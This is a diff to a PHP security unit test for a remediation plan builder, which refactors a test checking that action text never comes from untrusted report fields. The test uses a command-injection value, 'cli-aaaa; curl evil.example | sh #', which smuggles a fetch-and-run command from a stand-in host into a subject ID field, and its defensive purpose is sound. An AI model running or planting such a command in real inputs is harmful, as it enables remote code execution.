@@ -125,16 +125,15 @@ final class RemediationSecurityTest extends TestCase
 
     public function test_action_text_is_always_the_fixed_template_never_built_from_untrusted_fields(): void
     {
+        $hostileSubjectId = 'cli-aaaa; curl evil.example | sh #';
         $report = $this->baseReport([], [[
             'record_type' => 'assessment',
-            'record_id' => 'assessment:CVE-2026-109618:cli-aaaa',
-            'subject_id' => 'cli-aaaa; curl evil.example | sh #',
+            'record_id' => 'assessment:CVE-2026-109618:' . $hostileSubjectId,
+            'subject_id' => $hostileSubjectId,
             'verdict' => 'potentially_affected',
             'rationale' => 'irrelevant',
             'patch_evidence_ids' => [],
         ]]);
-        // subject_id must match record_id's embedded subject exactly, so align both to the hostile value.
-        $report['records'][1]['record_id'] = 'assessment:CVE-2026-109618:cli-aaaa; curl evil.example | sh #';
 
         $plan = (new RemediationPlanBuilder())->build($report);
 
@@ -187,7 +186,7 @@ final class RemediationSecurityTest extends TestCase
 
         $plan = (new RemediationPlanBuilder())->build($report);
         $json = json_encode($plan->toArray(), JSON_THROW_ON_ERROR);
-        self::assertIsString($json);
+        self::assertNotSame('', $json);
         self::assertLessThanOrEqual(1024, strlen($plan->actions[0]->subjectLabel));
     }
 
